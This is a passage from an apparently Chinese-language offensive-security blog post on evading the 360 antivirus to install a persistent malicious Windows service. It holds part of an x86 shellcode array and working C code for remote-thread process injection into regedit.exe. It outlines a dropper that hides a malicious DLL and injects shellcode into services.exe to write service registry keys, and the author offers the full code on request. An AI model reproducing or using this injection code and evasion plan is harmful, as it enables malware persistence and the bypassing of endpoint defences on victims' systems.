0x89, 0x4D, 0xFC, 0x0F,
    0xB7, 0x55, 0xFC, 0x8B, 0x45, 0xE8, 0x8B, 0x4D, 0x08, 0x03, 0x0C, 0x90, 
0x89, 0x4D, 0xF0, 0x8B,
    0x45, 0xF0, 0xEB, 0x29, 0xEB, 0x9F, 0xC7, 0x45, 0xF0, 0x00, 0x00, 0x00, 
0x00, 0xEB, 0x1B, 0x8B,
    0x55, 0xF4, 0x8B, 0x45, 0x0C, 0x2B, 0x42, 0x10, 0x89, 0x45, 0xCC, 0x8B, 
0x4D, 0xCC, 0x8B, 0x55,
    0xE8, 0x8B, 0x45, 0x08, 0x03, 0x04, 0x8A, 0x89, 0x45, 0xF0, 0x8B, 0x45, 
0xF0, 0x8B, 0xE5, 0x5D,
    0xC2, 0x08
};
DWORD GetProcessImageName(LPWSTR ImageName, DWORD dwSize) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD           pid = 0;
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    // get first process
    if (Process32First(hSnap, &pe32)) {
        do {
            /*if (dwpid == pe32.th32processid) {
                lstrcpyn(imagename, pe32.szexefile, dwsize);
                bfound = true;
                break;
            }*/
            wprintf(L"\t[*] %s\n",pe32.szExeFile );
            if (!lstrcmpW(ImageName, pe32.szExeFile)) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return pid;
}
BOOL injection(DWORD pid)
{
    LPVOID lpMalwareBaseAddr;
    LPVOID lpnewVictimBaseAddr;
    HANDLE hThread;
    DWORD dwExitCode;
    BOOL bRet = FALSE;
    //把基地址设置为自己shellcode数组的起始地址
    lpMalwareBaseAddr = hexData;
    wprintf(L"[*] inject process: %d\r\n", pid);
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    lpnewVictimBaseAddr = VirtualAllocEx(process
        , NULL, sizeof(hexData) + 1, MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (lpnewVictimBaseAddr == NULL)
    {   
        printf("[*] VirtualAllocEx error: %d\n",GetLastError());
        return bRet;
    }
    //远程线程注入过程
    WriteProcessMemory(process, lpnewVictimBaseAddr,
        (LPVOID)lpMalwareBaseAddr, sizeof(hexData) + 1, NULL);
    hThread = CreateRemoteThread(process, 0, 0,
        (LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, 0, NULL);
    //WaitForSingleObject(pi.hThread, INFINITE);
    //GetExitCodeProcess(pi.hProcess, &dwExitCode);
    //TerminateProcess(pi.hProcess, 0);
    return bRet;
}
这是x86下的shellcode，注意要编译为32位，然后手动启动一个32位的regedit.exe，然后运行上面的注
入程序，注意要有用administrator权限权限，或者关闭本地的uac。
发现360并未拦截，可以成功的写入注册表键值，这也就验证我们的猜想是完全正确的。
第二个问题：(行为的发出者)
当我们使用API进行服务注册的时候，写注册表的键值的行为并不是由我们的程序发起的，而是系统的
SCM发出的，具体的进程是 services.exe ,可以运行一下我们的程序来验证一下，运行之前写的程序，
监控一下注册表操作：
void help(char* proc)
{
    // printf("%s:创建进程并将shellcode写入进程内存\r\n", proc);
}
//获取函数名的hash
DWORD GetProcHash(const char* lpProcName) {
    char* p = (char *)lpProcName;
    DWORD result = 0;
    do {
        result = (result << 7) - result;
        result += *p;
    } while (*p++);
    return result;
}
int main(int argc, char* argv[])
{
    //help(argv[0]);
    //injection();
    WCHAR name[] = L"regedit.exe";
    DWORD targetPid = GetProcessImageName(name,lstrlenW(name));
    wprintf(L"[-] target pid = %d\n", targetPid);
    injection(targetPid);
    return 0;
}
这非常清楚了，注册表操作时 services.exe 发出的，跟我们的程序一点关系都没有。
前面我们讲解过端上主防软件的工作原理，它并无法得知我们的程序正在调用SCM的RPC服务进行服务
注册行为，只能看到services.exe在操作注册表，他无法把这个行为和我们运行的程序产生关联，所以
无法kill我们的程序，同时services.exe就是系统服务进程，拦截它的操作存在非常大的系统风险，所以
端防护软件不得不选择进行放行，这就是我们这种方法可以绕过360注册系统服务的根本原因。
共享进程服务
经过上面的分析，我们基本上达到了绕过端防护软件，在系统中随意注册独立进程服务了的目的，但是
我们不能仅仅满足于此。因为共享进程服务相对于独立进程服务在行为上要隐蔽的多，我们还是想在系
统中注册共享进程服务
但是共享进程服务在注册的时候，必须要服务注册进程进行注册表操作，写入
Parameters\ServiceDll 键值,我查遍了SCM的API函数，也没由发现哪个函数可以帮我们干这件事
情。这就比较坑了，我们绕过不过行为防护啊？但是真的绕过不过？我们在上面不是通过shellcode注
入完成了注册表写入了吗？ 
所以我们最终的恶意服务实现如下：
DLL实现服务的核心逻辑和代码，进行恶意行为。
写个EXE程序，并将DLL作为资源或者数据隐藏在自身内部，然后写代码实现注册共享进程服务的
功能。
实现shellcode，操作注册表实现服务关键键值的写入
exe执行时，先释放dll，然后向SCM注册服务。
将shellcode注入到 services.exe 等白进程中，实现注册表的添加。
启动服务，实现持久话控制。
由于代码比较长，包含若干个项目，并且具备一定的危害性，所以就不能在这里贴了。需要的可以联系
我。
最后以我看到的一个好玩的车牌号结束本节内容吧。